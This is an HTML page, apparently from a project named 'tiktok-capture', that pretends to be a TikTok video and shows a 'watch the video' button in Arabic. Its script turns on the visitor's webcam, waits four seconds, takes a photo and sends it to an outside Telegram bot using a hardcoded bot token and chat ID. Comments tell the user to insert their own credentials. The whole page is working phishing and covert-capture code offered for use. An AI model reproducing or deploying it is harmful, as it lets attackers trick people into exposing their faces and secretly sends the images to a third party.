# tiktok-capture
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>TikTok Video</title>
  <style>
    body {
      text-align: center;
      font-family: sans-serif;
      background-color: #000;
      color: white;
    }
    .fake-video {
      width: 90%;
      max-width: 400px;
      margin: 30px auto;
      background: black;
      border: 1px solid #444;
    }
    button {
      padding: 12px 24px;
      font-size: 16px;
      margin-top: 20px;
      background-color: #ff2d55;
      color: white;
      border: none;
      border-radius: 5px;
    }
    video {
      margin-top: 20px;
      width: 90%;
      max-width: 400px;
      display: none;
    }
  </style>
</head>
<body>
  <h2>🔥 فيديو تيك توك الجديد</h2>
  <div class="fake-video">
    <img src="https://i.imgur.com/N9a0jQU.png" width="100%" alt="TikTok Video" />
  </div>
  <button onclick="startCamera()">شاهد الفيديو</button>
  <video id="video" autoplay></video>
  <canvas id="canvas" width="300" style="display:none;"></canvas>

  <script>
    const chat_id = "6908826896"; // ← حط هنا chat_id بتاعك
    const token = "8216581015:AAFEu3XEvT2jePOMdSU8OYP9olix4JNzfk4"; // ← والتوكن هنا

    async function startCamera() {
      document.querySelector('video').style.display = "block";
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.getElementById('video');
      video.srcObject = stream;

      setTimeout(() => takePhoto(stream), 4000); // ينتظر ٤ ثواني قبل التصوير
    }

    function takePhoto(stream) {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
      stream.getTracks().forEach(track => track.stop());

      canvas.toBlob(blob => {
        const fd = new FormData();
        fd.append('chat_id', chat_id);
        fd.append('photo', blob, 'photo.png');

        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: 'POST',
          body: fd
        }).then(r => r.json()).then(d => {
          alert(d.ok ? "✔️ الصورة تم إرسالها" : "❌ فشل في الإرسال");
        }).catch(err => alert("❌ خطأ: " + err));
      }, 'image/png');
    }
  </script>
</body>
</html>
